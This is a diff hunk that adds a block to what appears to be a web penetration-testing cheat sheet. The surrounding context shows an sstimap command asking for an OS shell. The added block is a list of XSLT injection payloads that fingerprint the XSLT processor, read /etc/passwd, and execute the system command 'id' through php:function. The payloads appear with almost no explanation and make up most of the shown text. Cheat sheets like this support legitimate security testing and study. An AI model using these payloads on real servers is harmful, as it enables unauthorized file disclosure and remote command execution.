@@ -968,6 +968,17 @@ $ python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
 
 *Arise when an attacker can manipulate XSLT transformations performed on the server.*
 
+```
+<xsl:value-of select="system-property('xsl:version')" />
+<xsl:value-of select="system-property('xsl:vendor')" />
+<xsl:value-of select="system-property('xsl:vendor-url')" />
+<xsl:value-of select="system-property('xsl:product-name')" />
+<xsl:value-of select="system-property('xsl:product-version')" />
+<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
+<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
+<xsl:value-of select="php:function('system','id')" />
+```
+
 #14. - Sensitive Data Exposure
 -----------------------------------------
 
